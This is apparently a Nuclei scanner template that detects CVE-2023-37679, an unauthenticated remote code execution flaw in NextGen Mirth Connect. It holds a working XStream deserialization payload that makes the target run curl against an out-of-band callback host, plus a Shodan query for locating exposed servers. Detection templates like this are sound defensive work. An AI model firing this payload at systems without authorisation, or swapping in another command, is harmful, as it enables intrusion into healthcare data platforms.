http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body_1
    regex:
    - (.*)
    type: regex
  matchers:
  - condition: and
    dsl:
    - compare_versions(version, "<4.4.1")
    - contains(interactsh_protocol, "dns")
    - status_code_1 == 200 && status_code_2 == 500
    type: dsl
  raw:
  - 'GET /api/server/version HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: OpenAPI

    '
  - "POST /api/users HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: OpenAPI\nContent-Type:\
    \ application/xml\n\n<sorted-set>\n    <string>foo</string>\n    <dynamic-proxy>\n\
    \        <interface>java.lang.Comparable</interface>\n        <handler class=\"\
    java.beans.EventHandler\">\n            <target class=\"java.lang.ProcessBuilder\"\
    >\n                <command>\n                    <string>curl</string>\n    \
    \                <string>http://{{interactsh-url}}/</string>\n               \
    \ </command>\n            </target>\n            <action>start</action>\n    \
    \    </handler>\n    </dynamic-proxy>\n</sorted-set>\n"
id: CVE-2023-37679
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:nextgen:mirth_connect:4.3.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-37679
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.93304
    epss-score: 0.07033
  description: 'Mirth Connect, by NextGen HealthCare, is an open source data integration
    platform widely used by healthcare companies. Versions prior to 4.4.1 are vulnerable
    to an unauthenticated remote code execution vulnerability

    '
  metadata:
    max-request: 2
    product: mirth_connect
    shodan-query: title:"mirth connect administrator"
    vendor: nextgen
    verified: true
  name: NextGen Mirth Connect - Remote Code Execution
  reference:
  - https://www.horizon3.ai/nextgen-mirth-connect-remote-code-execution-vulnerability-cve-2023-43208/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-37679
  - http://mirth.com
  - http://nextgen.com
  severity: critical
  tags: cve2023,cve,nextgen,rce
